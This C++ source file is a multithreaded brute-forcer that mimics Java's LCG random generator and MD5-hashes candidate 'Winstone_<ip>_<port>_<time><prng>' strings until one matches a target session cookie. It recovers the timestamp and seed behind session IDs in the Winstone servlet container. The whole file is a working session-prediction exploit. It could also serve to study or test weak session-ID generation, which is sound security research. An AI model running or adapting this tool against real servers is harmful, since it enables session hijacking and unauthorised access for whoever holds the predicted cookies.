#include <iostream>
#include <thread>
#include <mutex>
#include "Options.h"
#include "JavaLCGMimic.h"
#include "md5.h"
#include "utils.h"


using namespace std;

// data shared between threads
typedef struct _shmem {
	long long timeMillis, PRNGMillis, seed;
	int PRNGseek;
	bool notfound = true;
} shmem;

//used instead memcmp
inline bool bcmp(unsigned char *a, unsigned char *b, int n){
	for (int i = 0; i < n; i++)
		if(b[i] ^ a[i]) 
			return false;

	return true;
}

void thr_brute(long long PRNGMillis, long long PRNGMillisMax, Options &opt, shmem *shm);

//mutex mtx; //DEBUG

int main(int argc, char *argv[]){
	Options opt(argc, argv);
	if (opt.opt_h){
		return 0;
	}
	if (opt.opt_c == 0 || opt.opt_i == 0 || opt.opt_p == 0 || opt.opt_t == 0 || opt.opt_s == 0){
		cout << "Wrong parameter!" << endl;
		opt.printHelp();
		return 10;
	}

	time_t start_t = time(0);
	long long PRNGMillis = opt.opt_t, 
		PRNGMillisMax = opt.opt_t + 1000 * opt.opt_e;
	
	long long cycles_per_thr = (PRNGMillisMax - PRNGMillis) / opt.opt_r + 1;
	shmem shm;

	thread *threads = new thread[opt.opt_r];
	for (int i = 0; i < opt.opt_r; i++){
		threads[i] = thread(thr_brute, PRNGMillis + i*cycles_per_thr, PRNGMillis + i*cycles_per_thr + cycles_per_thr, opt, &shm);
	}
	for (int i = 0; i < opt.opt_r; i++){ //wait
		threads[i].join();
	}
	delete[] threads;

	cout << "Finished in " << (time(0) - start_t) << " sec." << endl;
	return shm.notfound;
}

void thr_brute(long long PRNGMillis, long long PRNGMillisMax, Options &opt, shmem *shm){
	MD5_CTX *md5 = new MD5_CTX;
	unsigned char md5hash[16];//to store hash bytes
	JavaLCGMimic g;
	char strcookie[100]; //buffer to store composed cookie (100 - max length)
	int PRNGseekMax = opt.opt_n + 1;

	for (int PRNGseek = 1; PRNGseek < PRNGseekMax && shm->notfound; PRNGseek++){
		
		//mtx.lock(); //DEBUG
		//cout << this_thread::get_id() << ": [" << PRNGMillis << "," << PRNGMillisMax << "), " << PRNGseek <<", notfound="<<shm->notfound<< endl; //DEBUG
		//mtx.unlock(); //DEBUG

		long long iPRNGMillis = PRNGMillis;
		while (iPRNGMillis < PRNGMillisMax && shm->notfound){
			g.init(iPRNGMillis);

			long long PRNGout = -1;
			for (int i = 0; i < PRNGseek; i++) PRNGout = g.nextLong();

			long long timeMillis_min = opt.opt_s - opt.opt_m,
				timeMillis_max = opt.opt_s + 1000;
			for (long long timeMillis = timeMillis_min; timeMillis < timeMillis_max && shm->notfound; timeMillis++){
				memset(strcookie, 0, 100);
				snprintf(strcookie, 100, "Winstone_%s_%s_%lld%lld", opt.opt_i, opt.opt_p, timeMillis, PRNGout);
				MD5_Init(md5);
				MD5_Update(md5, strcookie, strlen(strcookie));
				MD5_Final(md5hash, md5);

				//mtx.lock(); //DEBUG
				//cout << this_thread::get_id() << ": '" << strcookie << "' md5=" << md5hash<<" ("<<opt.opt_c<<")" << endl;//DEBUG
				//cout << this_thread::get_id() << ": '" << strcookie << endl;//DEBUG
				//mtx.unlock(); //DEBUG
				
				if ( bcmp(md5hash, opt.opt_c_bin, 16) ){
					cout << "[!] Param found: timeMillis=" << timeMillis << " PRNGMillis=" << iPRNGMillis << " Seek=" << PRNGseek << " seed=" << g.seed << endl;
					shm->notfound = false;
					shm->PRNGMillis = iPRNGMillis;
					shm->PRNGseek = PRNGseek;
					shm->timeMillis = timeMillis;
					shm->seed = g.seed;
					break;
				}
			}

			iPRNGMillis++;
		}
	}

	delete md5;
}

